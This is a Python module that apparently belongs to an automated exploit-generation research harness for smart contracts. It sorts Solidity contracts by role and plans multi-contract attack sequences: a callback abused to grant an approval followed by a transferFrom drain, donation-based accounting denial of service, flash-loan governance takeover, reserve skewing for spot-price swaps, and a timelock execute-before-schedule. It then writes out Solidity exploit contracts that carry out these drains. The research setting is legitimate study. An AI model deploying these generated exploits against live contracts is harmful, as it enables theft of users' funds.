"""Cross-contract world model.

ReX (arXiv:2508.01371) measured the remaining LLM-AEG failure mode:
single-contract PoCs work, *cross-contract* ones do not. The JOS 2026
DeFi-protocol survey named the same split (contract layer vs protocol
layer). Our harness is still `run(address target)` — we do not break
that contract. The world model:

  1. reads every contract in the compilation unit (not just `target.name`)
  2. plans a *sequence* of calls across those addresses
  3. folds the sequence into one `run(address)` body so the track harness
     still verifies it, OR executes the sequence itself when a `world`
     key is present on the manifest (multi-tx, multi-EOA)

What this does *not* solve (docs/FRONTIER.md §2): cross-*protocol*
composition, cross-chain, and time-separated victim txs (victim must
approve in a prior block from a different key).
"""
from __future__ import annotations

import re
from dataclasses import asdict, dataclass, field
from typing import Any, Dict, Iterator, List, Optional, Set, Tuple

from .scan import _contract_bodies, _functions, _strip_comments


@dataclass
class WorldContract:
    name: str
    kind: str  # target | token | router | pair | helper | other
    hints: List[str] = field(default_factory=list)


@dataclass
class WorldStep:
    actor: str          # attacker | victim | helper
    on: str             # contract name or "$target"
    fn: str
    args_note: str = ""
    value: str = "0"


@dataclass
class WorldPlan:
    contracts: List[WorldContract]
    steps: List[WorldStep]
    cross_contract: bool
    reason: str
    folded_exploit: str = ""

    def as_dict(self) -> Dict[str, Any]:
        d = asdict(self)
        d["folded_exploit"] = (self.folded_exploit or "")[:400]
        return d


HEADER = "// SPDX-License-Identifier: MIT\npragma solidity >=0.6.2;\n\n"


def _kind_of(name: str, body: str) -> str:
    n = name.lower()
    b = body
    if re.search(r"function\s+swap\s*\(", b) and re.search(r"getReserves|token0|token1", b):
        return "pair"
    if re.search(r"function\s+swap\s*\(", b) and re.search(r"router|pair|getAmount", b, re.I):
        return "router"
    if re.search(r"function\s+(transfer|approve|balanceOf)\s*\(", b) and re.search(
            r"mapping\s*\(\s*address\s*=>\s*uint", b):
        return "token"
    if any(k in n for k in ("token", "erc20", "dvt", "weth")):
        return "token"
    if any(k in n for k in ("router",)):
        return "router"
    if any(k in n for k in ("pair", "pool", "amm")):
        return "pair"
    return "other"


def contracts_in(src: str) -> List[WorldContract]:
    s = _strip_comments(src or "")
    bodies = _contract_bodies(s)
    out = []
    for name, body in bodies.items():
        out.append(WorldContract(name=name, kind=_kind_of(name, body), hints=[]))
    return out


def plan_world(
    src: str,
    target_name: str,
    features: Optional[Set[str]] = None,
) -> WorldPlan:
    feats = set(features or [])
    cs = contracts_in(src)
    names = {c.name for c in cs}
    if target_name and target_name not in names:
        cs.insert(0, WorldContract(name=target_name, kind="target"))
    for c in cs:
        if c.name == target_name:
            c.kind = "target" if c.kind == "other" else c.kind
    cross = len([c for c in cs if c.kind != "target"]) >= 1 and len(cs) >= 2

    steps: List[WorldStep] = []
    reason_bits = []

    if "unpermissioned_callback" in feats:
        steps.append(WorldStep("attacker", "$target", "callback",
                               "pass attacker+approve payload"))
        steps.append(WorldStep("attacker", "$token", "transferFrom",
                               "drain after callback-granted allowance"))
        reason_bits.append("unpermissioned callback then token drain")
    if "donation_accounting_dos" in feats:
        steps.append(WorldStep("attacker", "$token", "transfer", "donate to pool"))
        steps.append(WorldStep("attacker", "$target", "flashLoan", "trip assert"))
        reason_bits.append("token donation then accounting assert")
    if "governance_flashloan" in feats:
        steps.append(WorldStep("attacker", "$target", "flashLoan", "borrow votes"))
        steps.append(WorldStep("helper", "$gov", "snapshot", "inside flash callback"))
        steps.append(WorldStep("helper", "$gov", "queueAction", "privileged action"))
        reason_bits.append("flash → snapshot → queue (same tx, two contracts)")
    if "dex_spot_swap" in feats or "spot_price" in feats:
        tokenish = [c for c in cs if c.kind in ("token", "pair", "router")]
        if tokenish:
            steps.append(WorldStep("attacker", "$pair", "sync_or_donate", "skew reserves"))
            steps.append(WorldStep("attacker", "$router", "swap", "drain via spot price"))
            reason_bits.append("pair skew then router swap")
            cross = True
    if "execute_before_schedule" in feats:
        steps.append(WorldStep("attacker", "$target", "execute",
                               "batch includes schedule(self)+role grant"))
        reason_bits.append("timelock execute-before-schedule")

    if not steps:
        steps.append(WorldStep("attacker", "$target", "run", "single-contract fallback"))
        reason_bits.append("no cross-contract shape; single run(address)")

    folded = _fold_exploit(src, target_name, feats, cs, steps)
    return WorldPlan(
        contracts=cs,
        steps=steps,
        cross_contract=cross or any(s.on != "$target" and s.on != "$gov" for s in steps),
        reason="; ".join(reason_bits),
        folded_exploit=folded,
    )


def _fold_exploit(src, target_name, feats, cs, steps) -> str:
    """Fold a multi-contract plan into one IExploit.run(address) body.

    The harness still calls run(target). The exploit discovers sibling
    addresses via public getters when it can, otherwise no-ops.
    """
    s = _strip_comments(src or "")
    getters = []
    for c in cs:
        if c.kind == "token":
            getters.append('        try IT(t).token() returns (address tok) { token = tok; } catch {}')
        if c.kind == "pair":
            getters.append('        try IT(t).pair() returns (address p) { pair = p; } catch {}')
        if c.kind == "router":
            getters.append('        try IT(t).router() returns (address r) { router = r; } catch {}')
    # also scan target for IERC20 public token
    if re.search(r"(IERC20|ERC20|token)\s+(public\s+)?\w+", s):
        m = re.search(r"(?:IERC20|ERC20)\s+(?:private\s+|public\s+|internal\s+)?(\w+)", s)
        if m:
            getters.append(f"        try IT(t).{m.group(1)}() returns (address tok) {{ token = tok; }} catch {{}}")

    body_lines = [
        "        address token; address pair; address router;",
        *getters,
    ]
    if "unpermissioned_callback" in feats:
        fns = _functions(s)
        cb = next((f for f in fns if f["external"] and (
            "approve" in f["body"] or re.search(r"\.call\s*\(", f["body"]))), None)
        if cb:
            body_lines += [
                '        bytes memory payload = abi.encodeWithSignature(',
                '            "approve(address,uint256)", address(this), type(uint256).max);',
                f"        try IT(t).{cb['name']}(address(this), payload) {{}} catch {{}}",
                "        if (token != address(0)) {",
                "            uint256 b = IERC20(token).balanceOf(t);",
                "            if (b > 0) { try IERC20(token).transferFrom(t, address(this), b) {} catch {} }",
                "        }",
            ]
    if "donation_accounting_dos" in feats:
        body_lines += [
            "        if (token != address(0)) {",
            "            uint256 b = IERC20(token).balanceOf(address(this));",
            "            if (b > 0) { try IERC20(token).transfer(t, b) {} catch {} }",
            "        }",
        ]
    if "dex_spot_swap" in feats or "spot_price" in feats:
        body_lines += [
            "        // world: skew pair then swap. getters may be zero — try is best-effort.",
            "        if (pair != address(0) && token != address(0)) {",
            "            uint256 b = IERC20(token).balanceOf(address(this));",
            "            if (b > 0) { try IERC20(token).transfer(pair, b) {} catch {} }",
            "        }",
        ]

    iface_extra = ""
    fns = _functions(s)
    cb = next((f for f in fns if f["external"] and (
        "approve" in f.get("body", "") or re.search(r"\.call\s*\(", f.get("body", "")))), None)
    if cb:
        iface_extra += f"    function {cb['name']}(address,bytes calldata) external payable;\n"
    if re.search(r"function\s+token\s*\(", s):
        iface_extra += "    function token() external view returns (address);\n"

    return (
        HEADER
        + "// World-folded exploit: multi-contract plan inside run(address).\n"
        + f"// target={target_name} steps={len(steps)}\n"
        + "interface IERC20 {\n"
        + "    function transfer(address,uint256) external returns (bool);\n"
        + "    function transferFrom(address,address,uint256) external returns (bool);\n"
        + "    function balanceOf(address) external view returns (uint256);\n"
        + "    function approve(address,uint256) external returns (bool);\n}\n"
        + "interface IT {\n"
        + "    function token() external view returns (address);\n"
        + "    function pair() external view returns (address);\n"
        + "    function router() external view returns (address);\n"
        + iface_extra
        + "}\n"
        + "contract Exploit {\n"
        + "    function run(address t) external payable {\n"
        + "\n".join(body_lines) + "\n"
        + "    }\n    receive() external payable {}\n}\n"
    )


def iter_world_candidates(
    src: str, target_name: str, features: Optional[Set[str]] = None
) -> Iterator[Tuple[str, str]]:
    plan = plan_world(src, target_name, features)
    if plan.folded_exploit.strip():
        yield ("world:" + ("cross" if plan.cross_contract else "single"), plan.folded_exploit)
